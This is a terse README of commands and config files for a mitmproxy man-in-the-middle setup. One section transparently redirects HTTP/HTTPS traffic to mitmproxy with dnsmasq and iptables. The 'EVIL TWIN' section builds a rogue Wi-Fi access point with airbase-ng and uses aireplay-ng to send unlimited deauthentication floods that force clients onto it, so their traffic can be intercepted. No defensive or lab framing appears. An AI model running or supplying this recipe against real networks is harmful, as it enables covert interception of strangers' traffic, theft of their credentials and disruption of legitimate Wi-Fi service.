# alice
Remote mitmproxy MITM implementation

# PASSTHROUGH:
apt-get install dnsmasq

/etc/dnsmasq.conf:

interface=eth1
dhcp-range=192.168.3.10,192.168.3.100,96h
dhcp-option=option:router,192.168.3.1
dhcp-option=option:dns-server,192.168.3.1

/etc/network/interfaces:

auto eth1
iface eth1 inet static
    address 192.168.3.1/24
    gateway 192.168.0.1

ip addr flush dev eth1 && ifdown -a && ifup -a

sudo service dnsmasq restart


iptables -t nat -A PREROUTING -i eth1 -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i eth1 -p tcp --dport 443 -j REDIRECT --to-port 8080


mitmproxy -T --stream 1k -s filters.py

# EVIL TWIN
apt-get install dnsmasq

/etc/dnsmasq.conf:

interface=at0
dhcp-range=192.168.3.10,192.168.3.100,96h
dhcp-option=option:router,192.168.3.1
dhcp-option=option:dns-server,192.168.3.1

iptables -t nat -A PREROUTING -i at0 -p tcp -j REDIRECT --to-port 8080

/etc/network/interfaces:

auto at0
iface at0 inet static
    address 192.168.3.1/24
    gateway 192.168.0.1

airmon-ng start wlan0
airodump-ng wlan0mon
airbase-ng -a 00:07:26:3F:36:8C --essid mywifi -c 11 wlan0mon
aireplay-ng --deauth 0 -a 00:07:26:3F:36:8C wlan0mon --ignore-negative-one

ip addr flush dev at0 && ifdown -a && ifup -a
sudo service dnsmasq restart


mitmproxy -T --stream 1k -s filters.py
